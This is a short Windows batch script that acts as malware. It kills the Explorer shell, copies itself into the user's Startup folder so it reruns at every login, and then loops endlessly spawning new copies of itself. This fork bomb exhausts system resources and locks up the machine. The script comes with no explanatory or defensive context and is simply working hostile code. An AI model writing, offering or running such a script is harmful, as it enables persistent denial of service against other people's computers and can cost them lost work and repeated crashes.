@echo off

taskkill /f /im explorer.exe

set "batch_file=%~f0"

set "startup_dir=%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup"

if not exist "%startup_dir%\start.bat" (
    copy "%batch_file%" "%startup_dir%\start.bat"
)

:loop

start "" "%~f0"
goto loop                            